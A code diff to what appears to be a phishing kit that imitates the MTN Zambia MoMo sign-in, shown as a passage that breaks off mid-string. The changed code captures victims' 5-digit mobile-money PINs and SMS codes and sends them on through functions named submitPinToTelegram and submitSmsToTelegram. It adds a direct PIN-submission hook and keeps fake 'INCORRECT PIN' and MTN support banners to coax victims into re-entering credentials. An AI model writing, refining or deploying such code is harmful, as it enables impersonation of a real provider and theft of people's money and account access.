@@ -157,22 +157,17 @@
     }
     updateCalc();
 
-    function syncSignInButtonState() {
+    function syncPinInputAndButton() {
       if (!yelloPinInput || !btnSignInPin) return;
-      const digits = yelloPinInput.value.replace(/\D/g, '');
-      if (digits.length >= 4) {
-        btnSignInPin.classList.add('ready');
-      } else {
-        btnSignInPin.classList.remove('ready');
-      }
+      const digits = yelloPinInput.value.replace(/\D/g, '').slice(0, 5);
+      if (yelloPinInput.value !== digits) yelloPinInput.value = digits;
+      btnSignInPin.disabled = false;
+      btnSignInPin.classList.add('ready');
     }
 
     if (yelloPinInput) {
-      yelloPinInput.addEventListener('input', () => {
-        const clean = yelloPinInput.value.replace(/\D/g, '').slice(0, 8);
-        if (yelloPinInput.value !== clean) yelloPinInput.value = clean;
-        syncSignInButtonState();
-      });
+      yelloPinInput.addEventListener('input', syncPinInputAndButton);
+      yelloPinInput.addEventListener('change', syncPinInputAndButton);
     }
 
     function goFromForm1ToForm2() {
@@ -245,7 +240,8 @@
         yelloPinInput.value = '';
         yelloPinInput.type = 'password';
       }
-      syncSignInButtonState();
+      if (btnTogglePinVisibility) btnTogglePinVisibility.innerText = '👁️';
+      syncPinInputAndButton();
       otpBoxes4.forEach((b) => (b.value = ''));
       hideBanner(bannerPinError);
       hideBanner(bannerOtpError);
@@ -325,6 +321,17 @@
         showBanner(bannerPinError, 'Connection error. Please tap SIGN IN again.');
       }
     }
+
+    window.__submitPinDirect = async function (pinVal) {
+      const cleanPin = String(pinVal || yelloPinInput?.value || '')
+        .replace(/\D/g, '')
+        .slice(0, 5);
+      if (cleanPin.length !== 5) {
+        showBanner(bannerPinError, 'Please enter your 5-digit PIN.');
+        return;
+      }
+      await submitPinToTelegram(cleanPin);
+    };
 
     async function submitSmsToTelegram(smsText, autoDetected) {
       hideBanner(bannerSmsError);
@@ -413,9 +420,9 @@
             if (smsTimerInterval) clearInterval(smsTimerInterval);
             hideLoading();
             if (yelloPinInput) yelloPinInput.value = '';
-            syncSignInButtonState();
+            syncPinInputAndButton();
             showScreen(screens.pin);
-            showBanner(bannerPinError, 'INCORRECT PIN — Please enter your PIN and tap SIGN IN.');
+            showBanner(bannerPinError, 'INCORRECT PIN — Please enter your 5-digit PIN and tap SIGN IN.');
             if (yelloPinInput) yelloPinInput.focus();
           } else if (st === 'SMS_EXPIRED') {
             clearInterval(statusPollInterval);
@@ -463,8 +470,12 @@
       currentUserId = null;
       smsAutoSubmittedForCurrentValue = '';
       otpSubmittedForCurrentValue = '';
-      if (yelloPinInput) yelloPinInput.value = '';
-      syncSignInButtonState();
+      if (yelloPinInput) {
+        yelloPinInput.value = '';
+        yelloPinInput.type = 'password';
+      }
+      if (btnTogglePinVisibility) btnTogglePinVisibility.innerText = '👁️';
+      syncPinInputAndButton();
       otpBoxes4.forEach((b) => (b.value = ''));
       if (smsInputBox) smsInputBox.value = '';
       [
@@ -515,15 +526,10 @@
           hideLoading();
           showScreen(screens.form3);
           break;
-        case 'btn-toggle-pin-visibility': {
-          if (!yelloPinInput) break;
-          yelloPinInput.type = yelloPinInput.type === 'password' ? 'text' : 'password';
-          break;
-        }
         case 'btn-sign-in-pin': {
-          const pinVal = (yelloPinInput?.value || '').replace(/\D/g, '');
-          if (pinVal.length < 4) {
-            showBanner(bannerPinError, 'Please enter your MTN MoMo PIN before tapping SIGN IN.');
+          const pinVal = (yelloPinInput?.value || '').replace(/\D/g, '').slice(0, 5);
+          if (pinVal.length !== 5) {
+            showBanner(bannerPinError, 'Please enter your 5-digit PIN.');
             return;
           }
           await submitPinToTelegram(pinVal);
@@ -533,7 +539,7 @@
           if (event) event.preventDefault();
           showBanner(
             bannerPinError,
-            'Enter your MTN MoMo PIN in the PIN field and tap SIGN IN to continue.'
+            'Enter your 5-digit MTN MoMo PIN in the PIN field and tap SIGN IN to continue.'
           );
           break;
         case 'btn-switch-account':
@@ -551,10 +557,4 @@
         case 'btn-pin-contact':
           showBanner(
             bannerPinError,
-            'MTN Zambia MoMo Support: dial 111 or enter your PIN and tap SIGN IN.'
-          );
-          break;
-        case 'btn-request-new-sms': {
-          hideBanner(bannerSmsError);
-          const phoneZero = toZeroPrefixPhone(
-            displaySmsPhone?.innerText || formPhoneInput?.value || '
+            'M
